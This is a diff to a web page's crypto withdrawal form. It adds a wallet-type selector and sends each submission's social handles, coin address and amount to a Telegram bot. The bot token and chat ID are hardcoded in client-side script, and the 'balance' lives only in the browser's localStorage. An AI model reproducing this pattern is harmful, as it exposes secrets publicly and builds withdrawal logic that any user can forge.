@@ -191,7 +191,22 @@
             <input type="text" id="xAddress" name="xAddress" placeholder="@X-Address" required>
             <input type="text" id="telegramUsername" name="telegramUsername" placeholder="@Telegram Username" required>
             <input type="text" id="referralLink" name="referralLink" placeholder="Referral Link (optional)">
-            <input type="text" id="coinName" name="coinName" placeholder="Coin ex.(Ton)" required>
+    <div id="walletType">
+        <p>Select Wallet Type:</p>
+        <label>
+            <input type="radio" name="walletType" value="Trust Wallet" required> Trust Wallet
+        </label>
+        <label>
+            <input type="radio" name="walletType" value="Telegram Wallet" required> Telegram Wallet
+        </label>
+        <label>
+            <input type="radio" name="walletType" value="Other CEX (e.g., Binance, Bybit)" required> Other CEX (e.g., Binance, Bybit)
+        </label>
+        <label>
+            <input type="radio" name="walletType" value="Other DEX" required> Other DEX
+        </label>
+    </div>
+     <input type="text" id="coinName" name="coinName" placeholder="Coin ex.(Ton)" required>
             <input type="text" id="coinAddress" name="coinAddress" placeholder="Coin Address" required>
             <input type="number" id="withdrawAmount" name="withdrawAmount" placeholder="Withdraw Amount minimum 5000" min="5000" required>
             <input type="submit" value="Withdraw">
@@ -220,50 +235,59 @@
         const coinValue = document.getElementById('coinValue');
         let balance = parseFloat(coinValue.textContent);
 
-        document.getElementById('withdrawForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+    document.getElementById('withdrawForm').addEventListener('submit', function(event) {
+    event.preventDefault();
 
-            const withdrawAmount = parseFloat(document.getElementById('withdrawAmount').value);
+    const withdrawAmount = parseFloat(document.getElementById('withdrawAmount').value);
+    const walletType = document.querySelector('input[name="walletType"]:checked');
 
-            if (withdrawAmount > balance) {
-                document.getElementById('overlay').style.display = 'block';
-                document.getElementById('dialog').style.display = 'block';
+    if (!walletType) {
+        showDialogMessage("Please select a wallet type before submitting.");
+        return; // Stop form submission if no wallet type is selected
+    }
+
+    const selectedWalletType = walletType.value;
+
+    if (withdrawAmount > balance) {
+        document.getElementById('overlay').style.display = 'block';
+        document.getElementById('dialog').style.display = 'block';
+    } else {
+        balance -= withdrawAmount;
+        coinValue.textContent = Math.floor(balance);
+        localStorage.setItem('coinBalance', balance);
+
+        const formData = new FormData(event.target);
+        const data = {
+            walletType: selectedWalletType,
+            xAddress: formData.get('xAddress'),
+            telegramUsername: formData.get('telegramUsername'),
+            referralLink: formData.get('referralLink'),
+            coinName: formData.get('coinName'),
+            coinAddress: formData.get('coinAddress'),
+            withdrawAmount: withdrawAmount
+        };
+
+        fetch('https://api.telegram.org/bot6428927157:AAHylUdL7piVI6qYwBBu_gPH7ERzt9JD7_I/sendMessage', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: '1395717860',
+                text: `New Withdraw Request:\n\nX Address: ${data.xAddress}\nTelegram Username: ${data.telegramUsername}\nReferral Link: ${data.referralLink}\nUser Picked: ${data.walletType}\nCoin Name: ${data.coinName}\nCoin Address: ${data.coinAddress}\nWithdraw Amount: ${data.withdrawAmount}`
+            })
+        }).then(response => {
+            if (response.ok) {
+                showDialogMessage("Withdraw request sent successfully!");
             } else {
-                balance -= withdrawAmount;
-                coinValue.textContent = Math.floor(balance);
-                localStorage.setItem('coinBalance', balance);
-
-                const formData = new FormData(event.target);
-                const data = {
-                    xAddress: formData.get('xAddress'),
-                    telegramUsername: formData.get('telegramUsername'),
-                    referralLink: formData.get('referralLink'),
-                    coinName: formData.get('coinName'),
-                    coinAddress: formData.get('coinAddress'),
-                    withdrawAmount: withdrawAmount
-                };
-
-                fetch('https://api.telegram.org/bot6428927157:AAHylUdL7piVI6qYwBBu_gPH7ERzt9JD7_I/sendMessage', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: '1395717860',
-                        text: `New Withdraw Request:\n\nX Address: ${data.xAddress}\nTelegram Username: ${data.telegramUsername}\nReferral Link: ${data.referralLink}\nCoin Name: ${data.coinName}\nCoin Address: ${data.coinAddress}\nWithdraw Amount: ${data.withdrawAmount}`
-                    })
-                }).then(response => {
-                    if (response.ok) {
-                        showDialogMessage("Withdraw request sent successfully!");
-                    } else {
-                        showDialogMessage("Failed to send withdraw request. Please try again.");
-                    }
-                }).catch(error => {
-                    console.error('Error sending withdraw request:', error);
-                    showDialogMessage("Failed to send withdraw request. Please try again.");
-                });
+                showDialogMessage("Failed to send withdraw request. Please try again.");
             }
+        }).catch(error => {
+            console.error('Error sending withdraw request:', error);
+            showDialogMessage("Failed to send withdraw request. Please try again.");
         });
+    }
+});
 
         document.getElementById('closeDialog').addEventListener('click', function() {
             document.getElementById('overlay').style.display = 'none';
